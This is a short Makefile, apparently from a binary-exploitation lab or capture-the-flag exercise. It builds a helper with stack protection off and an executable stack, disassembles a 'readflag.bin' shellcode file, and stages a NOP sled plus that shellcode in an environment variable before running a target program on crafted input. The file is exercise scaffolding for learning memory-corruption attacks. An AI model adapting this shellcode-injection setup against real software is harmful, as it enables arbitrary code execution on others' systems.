CFLAGS := -m32 -std=gnu99 -g -O0 -fno-stack-protector -z execstack

ALL := get_env

all: $(ALL)

#$@ is the name of the file being generated, and $< the first prerequisite (usually the source file).
#Here, $@ = target, $< = target.c
get_env: get_env.c
	$(CC) $(CFLAGS) -o $@ $<


objdump_readflag.bin:
	objdump -m i386 -D -b binary readflag.bin

hexedit: input
	hexedit input

setup_env:
	bash -c 'export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat readflag.bin)'

run:
	bash -c './target \$(cat test)'

clean:
	rm -f $(ALL) 

.PHONY: all clean